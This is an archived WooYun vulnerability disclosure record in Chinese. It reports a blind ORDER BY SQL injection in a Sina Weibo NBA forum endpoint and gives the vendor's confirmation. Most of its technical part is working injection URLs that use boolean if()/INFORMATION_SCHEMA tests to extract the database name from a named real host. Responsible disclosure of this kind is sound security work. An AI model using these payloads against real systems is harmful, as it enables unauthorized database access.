{"id": 1232, "wybug_id": "wooyun-2014-071498", "wybug_title": "新浪微博某站sql盲注", "wybug_corp": "新浪", "wybug_author": "nextdoor", "wybug_date": "2014-08-08 00:08", "wybug_open_date": "2014-09-22 00:10", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["字符类型注射"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-08-08：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-08-08：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-08-18：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-08-28：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-09-07：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-09-22：\t细节向公众公开  简要描述： 新浪微博某站sql盲注 详细说明：  存在漏洞的url,参数是order_typehttp://nba.weibo.com/forum/fans/rank_list?forum_id=7&order_field=post_num&order_type=DESC主要是order by 型注入\nhttp://nba.weibo.com/forum/fans/rank_list?forum_id=7&order_field=post_num&order_type=DESC,if((1=1),1,(select%201%20from%20INFORMATION_SCHEMA.TABLES))%20asc#  //返回正确\n\n\n\nhttp://nba.weibo.com/forum/fans/rank_list?forum_id=7&order_field=post_num&order_type=DESC,if((1=2),1,(select%201%20from%20INFORMATION_SCHEMA.TABLES))%20asc# //返回错误\n\n\n这样我们就可以进行盲注了\nhttp://nba.weibo.com/forum/fans/rank_list?forum_id=7&order_field=post_num&order_type=DESC,if((length(database())=3),1,(select%201%20from%20INFORMATION_SCHEMA.TABLES))%20asc# //返回正确http://nba.weibo.com/forum/fans/rank_list?forum_id=7&order_field=post_num&order_type=DESC,if((mid(database(),1,3)='nba'),1,(select%201%20from%20INFORMATION_SCHEMA.TABLES))%20asc# //返回正确\n可以得到数据库为nba   漏洞证明：  存在漏洞的url,参数是order_typehttp://nba.weibo.com/forum/fans/rank_list?forum_id=7&order_field=post_num&order_type=DESC主要是order by 型注入\nhttp://nba.weibo.com/forum/fans/rank_list?forum_id=7&order_field=post_num&order_type=DESC,if((1=1),1,(select%201%20from%20INFORMATION_SCHEMA.TABLES))%20asc#  //返回正确\n\n\n\nhttp://nba.weibo.com/forum/fans/rank_list?forum_id=7&order_field=post_num&order_type=DESC,if((1=2),1,(select%201%20from%20INFORMATION_SCHEMA.TABLES))%20asc# //返回错误\n\n\n这样我们就可以进行盲注了\nhttp://nba.weibo.com/forum/fans/rank_list?forum_id=7&order_field=post_num&order_type=DESC,if((length(database())=3),1,(select%201%20from%20INFORMATION_SCHEMA.TABLES))%20asc# //返回正确http://nba.weibo.com/forum/fans/rank_list?forum_id=7&order_field=post_num&order_type=DESC,if((mid(database(),1,3)='nba'),1,(select%201%20from%20INFORMATION_SCHEMA.TABLES))%20asc# //返回正确\n可以得到数据库为nba   修复方案：  过滤order_type参数，可以限制order by 后参数的长度在一定范围内   版权声明：转载请注明来源 nextdoor@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：6  确认时间：2014-08-08 09:33 厂商回复： 感谢对新浪安全工作的支持，漏洞正在修复。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-08-08 00:22 |    \t\tnextdoor \t\t\t( 普通白帽子  |\t\t\t        Rank:325 漏洞数:74        )\t\t \n  谁凌晨还在审核，大赞    \n     2014-08-08 01:34 |    \t\t黑名单 \t\t\t( 实习白帽子  |\t\t\t        Rank:60 漏洞数:13        | 像个傻瓜似的，为什么。)\t\t \n  大牛大赞 半夜不休息 辛苦洞主挖洞了    \n     2014-08-08 08:46 |    \t\t腹黑 \t\t\t( 路人 |\t\t\t        Rank:14 漏洞数:10        | (◦ \"̮ ◦))\t\t \n  - -我说谁在审核啊我那个中德瑞手机官网的都提交这么久了咋还在审核    \n     2014-09-22 08:06 |    \t\t第四维度 \t\t\t( 实习白帽子  |\t\t\t        Rank:58 漏洞数:34        | 谦谦君子，温润如玉)\t\t \n  mark    \n     2014-09-22 09:46 |    \t\tSeven.Sea \t\t\t( 实习白帽子  |\t\t\t        Rank:76 漏洞数:24        | 唯有安全与美食不可辜负。)\t\t \n  大半夜还在审核=w=赞~    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 6, "Ranks": null}